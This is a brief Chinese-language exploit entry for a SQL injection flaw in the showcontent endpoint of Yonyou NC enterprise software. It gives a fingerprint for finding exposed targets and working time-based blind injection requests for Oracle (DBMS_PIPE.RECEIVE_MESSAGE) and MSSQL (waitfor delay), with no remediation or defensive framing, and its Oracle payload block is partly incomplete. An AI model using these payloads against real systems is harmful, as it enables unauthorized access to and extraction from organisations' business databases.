# 用友nc-showcontent-Sql注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="UClient.dmg"`
- **请求**：`GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)CHR(76)CHR(108)CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1`

**Payload**
```
Oracle：
Host:
Content-Type: text/xml; charset=utf-8
SL-CE-SUID: 31
mssql:
GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:6
Host:
```